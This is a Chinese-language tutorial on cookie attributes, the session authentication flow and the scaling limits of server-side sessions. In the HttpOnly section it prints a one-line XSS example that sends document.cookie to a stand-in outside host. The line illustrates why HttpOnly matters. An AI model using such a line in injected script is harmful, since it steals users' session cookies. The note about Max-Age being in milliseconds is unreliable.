<!--
 * @Author: hucheng
 * @Date: 2019-09-07 18:57:19
 * @Description: here is des
 -->
# cookie,session 认证

## what is cookie
网上已经说烂了，还不知道可以看MDN https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Cookies

## 概要
 - cookie 组成
 - cookie 产生整个交互过程
 - cookie seesion 存在的问题
 - demo
 

## cookie 组成

虽然cookie 属性说烂了，列还是得列一下，主要关注 **Domain , HttpOnly , SameSite**

![cooki_names.png-45.1kB][1]

- **Name, Value**
 Name 和 Value 是必须的 Session 里的 SessionId 就是 Name 设置的

- **Domain** 

    默认是当前域名 假设 访问的是`a.hucheng.com`,那么前端cookie的domain只能设置`a.hucheng.com`和其父域名`hucheng.com`，如果设置成同级域名如`b.hucheng.com`或者子域名`a.aa.hucheng.com` 那么cookie设置将无效。
    
    当 cookie 设置 父域名hucheng.com的时候 ,2个子域名(`a.hucheng.com,b.hucheng.com`)就可以获取到cookie的信息,通过cookie来传递信息
    
    ```
     在 a.hucheng.com 下面 login 方法执行
      router.post('/login', async (req, res, next) => {
      res.cookie("user_token", req.body.userName,{domain:"hucheng.com"});
      res.send({code:1})
    });
    a.hucheng.com 控制台执行
    window.open("b.hucheng.com");
    可以发现 b.hucheng.com 域名下 cookie 里有 user_token 这个值
    
    ```
划重点 **Domain 的这种属性 可以用来 子域名之间的通信**，大部分二级域名之间跳转都是使用这个属性
- **Path**   
 设置路径cookie 生效路径  
- **Max-Age // 过期时间** 
  默认是毫秒,超过这个时间，浏览器自动删除，其实还有个Expires,Expires 是 Http1.0的，基本废弃了
- **Size**    // 只读大小
- **HttpOnly**  
  httpOnly,设置了这个就不能通过js 里的 document.cookie 获取了，默认是false,这个特性，也用的很多，一般我们敏感的信息都设成tre，比方 seesionId，token，非敏感设置成 false，比方记录来源，
```javascript
 httpOnly ==false;
 const cookie = document.cookie // "user_token=xxx"
 httpOnly ==true;
 const cookie = document.cookie // ""
 // 设置成 true 的时候 就可以防止部分Xss攻击
  new Image().src == "fuckxss.com?a="+document.cookie
```
- **SameSite**
  这个是 Chrome 提出来的 跨域共享 cookie

- **Secure**   
  只有在 https里使用,传输过程会加密


## cookie 产生整个交互过程

![cooki_flow.png-32.9kB][2]

1. 使用浏览器访问服务端页面；
2. 服务端收到该客户端第一次请求后，会创建一个 session ，生产一个唯一 sessionId ；
3. 同时在响应请求中设置 cookie ，属性名为jessionid；
4. 客户端收到后会保存 jessionid ，再次请求时，会在 header 中设置，服务端可从请求头中获取；
5. 服务端验证获取的 sessionId 是否存在，即可验证是否是同一用户；

当浏览器禁用 cookie 后，基于 cookie 的 session 将不能正常工作，每次都将创建一个新的 session ，可通过url重写传递 sessionid。

## cookie seesion 存在的问题
在网民不多，喷子还很少的年代，cookie seesion 是够用的，但是负载大了以后，比方微博这种，一个系统保存上亿的 seessionId，也是够够的，那是不是可以搞个负载均衡 ，把 sessionId 都存到 Redis 缓存，所有的机器都来访问这个地方的数据， 这样一来，就不用复制了， 但是增加了单点失败的可能性， 要是那个负责 session 的机器挂了，  所有人都得重新登录一遍， 估计得被人骂死。

![image.png-62.9kB][3]


怎么办？ 有没有啥办法，我不存这些用户 sessionId,让浏览器自己管理起来么，**JWT 小老弟**，要出场了,下回讲JWT

## Demo
[放到github上了,有cookie 每个属性操作例子](https://github.com/hucheng91/frontend-note/tree/master/oauth/cookie)
Node.js写的，有清晰的注释，没写过Node.js的前端er也能看明白的，如果你平常对 cookie 的的理解都来源于文章，没实操过，建议把 Demo 自己来一遍
## 参考资料
[cookie MDN介绍](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Cookies)
[JAVA 版 单点登录与权限管理本质：session和cookie介绍](https://mp.weixin.qq.com/s?__biz=MzA5Njc2OTg4NQ==&mid=2247483703&idx=1&sn=fd9984e2e7c6aee7429f261697dfacbd&chksm=90aa4305a7ddca13fcc28fd6266b0e19ad1961a79387b89f213f5b6f93beef5ad06a2cc8916e&scene=21#wechat_redirect)
[干掉状态：从session到token](https://mp.weixin.qq.com/s?src=11&timestamp=1543738567&ver=1279&signature=pXd5T17vZ04cw*hTuAivx5485tGsOorFtTiVYYrBDWKkaeYep1zWFRTHO0qn5N3bVZUnr71XCkam4be2kIKbGO3IxhxDYgnEZ7eJ*AYpdQmIi98AeyK-mhoMlmQeYDvm&new=1)




  [1]: http://static.zybuluo.com/hucheng91/7jinfnjao8k2y6alnmja5t7l/cooki_names.png
  [2]: http://static.zybuluo.com/hucheng91/nd91yozvmocnvwi4xyr6lkyg/cooki_flow.png
  [3]: http://static.zybuluo.com/hucheng91/w3yksf74zpya2i2pfsw7ljlx/image.png